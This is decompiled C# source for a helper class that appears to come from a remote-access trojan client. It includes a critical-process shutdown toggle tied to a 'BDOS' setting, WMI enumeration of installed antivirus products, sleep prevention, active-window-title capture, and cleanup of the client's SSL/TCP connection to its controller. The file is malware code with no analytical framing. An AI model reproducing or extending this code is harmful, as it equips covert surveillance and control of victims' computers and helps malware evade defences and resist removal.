using System;
using System.Collections.Generic;
using System.Drawing.Imaging;
using System.Management;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Principal;
using System.Text;
using Client.Connection;

namespace Client.Helper
{
	// Token: 0x02000009 RID: 9
	public static class Methods
	{
		// Token: 0x06000030 RID: 48 RVA: 0x0000217B File Offset: 0x0000037B
		public static bool IsAdmin()
		{
			return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
		}

		// Token: 0x06000031 RID: 49 RVA: 0x00003944 File Offset: 0x00001B44
		public static void ClientOnExit()
		{
			try
			{
				if (Convert.ToBoolean(Settings.BDOS) && Methods.IsAdmin())
				{
					ProcessCritical.Exit();
				}
				MutexControl.CloseMutex();
				SslStream sslClient = ClientSocket.SslClient;
				if (sslClient != null)
				{
					sslClient.Close();
				}
				Socket tcpClient = ClientSocket.TcpClient;
				if (tcpClient != null)
				{
					tcpClient.Close();
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000032 RID: 50 RVA: 0x000039BC File Offset: 0x00001BBC
		public static string Antivirus()
		{
			string text;
			try
			{
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "Select * from AntivirusProduct"))
				{
					List<string> list = new List<string>();
					foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
					{
						list.Add(managementBaseObject["displayName"].ToString());
					}
					if (list.Count == 0)
					{
						text = "N/A";
					}
					else
					{
						text = string.Join(", ", list.ToArray());
					}
				}
			}
			catch
			{
				text = "N/A";
			}
			return text;
		}

		// Token: 0x06000033 RID: 51 RVA: 0x00003AAC File Offset: 0x00001CAC
		public static ImageCodecInfo GetEncoder(ImageFormat format)
		{
			foreach (ImageCodecInfo imageCodecInfo in ImageCodecInfo.GetImageDecoders())
			{
				if (imageCodecInfo.FormatID == format.Guid)
				{
					return imageCodecInfo;
				}
			}
			return null;
		}

		// Token: 0x06000034 RID: 52 RVA: 0x00003AF4 File Offset: 0x00001CF4
		public static void PreventSleep()
		{
			try
			{
				NativeMethods.SetThreadExecutionState((NativeMethods.EXECUTION_STATE)2147483651U);
			}
			catch
			{
			}
		}

		// Token: 0x06000035 RID: 53 RVA: 0x00003B28 File Offset: 0x00001D28
		public static string GetActiveWindowTitle()
		{
			try
			{
				StringBuilder stringBuilder = new StringBuilder(256);
				if (NativeMethods.GetWindowText(NativeMethods.GetForegroundWindow(), stringBuilder, 256) > 0)
				{
					return stringBuilder.ToString();
				}
			}
			catch
			{
			}
			return "";
		}
	}
}
